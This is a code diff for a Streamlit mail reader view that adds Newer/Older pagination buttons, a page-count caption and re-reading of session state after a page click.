-                f"Retrieved {len(_r_msgs)} recent message(s) from {_r_for}. "
-                f"Tap a message to open its body.")
+                f"Retrieved {len(_r_msgs)} of {_r_total or len(_r_msgs)} message(s) from "
+                f"{_r_for} - page {_r_page} of {_r_pages}. Tap a message to open its body.")
+            _r_combo = str_lit.session_state.get("bb_reader_combo") or selected_combo
+            if _r_pages > 1:
+                _pn1, _pn2, _pn3 = str_lit.columns([0.32, 0.36, 0.32])
+                with _pn1:
+                    if str_lit.button("⬅ Newer", width="stretch", key="bb_reader_prev",
+                                      disabled=_r_page <= 1,
+                                      help="The next page of more recent messages."):
+                        _reader_do_fetch(_r_combo, max_msgs, _r_page - 1)
+                with _pn2:
+                    str_lit.caption(f"page **{_r_page}** of {_r_pages} · "
+                                    f"{_r_total} message(s) in the inbox")
+                with _pn3:
+                    if str_lit.button("Older ➡", width="stretch", key="bb_reader_next",
+                                      disabled=_r_page >= _r_pages,
+                                      help="The next page of older messages."):
+                        _reader_do_fetch(_r_combo, max_msgs, _r_page + 1)
+                # A page click fetched already, so the list below must be re-read
+                # or it would render the page before the click for one run.
+                _r_msgs = str_lit.session_state.get("bb_reader_msgs") or _r_msgs
+                _r_for = str_lit.session_state.get("bb_reader_for") or _r_for
+                _r_note = str_lit.session_state.get("bb_reader_note") or ""
+                if _r_note:
+                    str_lit.warning(f"Could not read mailbox: {_r_note}")
             # FIX BODY-KEY (v13.57): the body key was "bbbody_%d" - POSITIONAL. Open
             # account A, switch to account B, read: message 1 of B reused key
             # "bbbody_1", the seed below found the key already present and skipped,
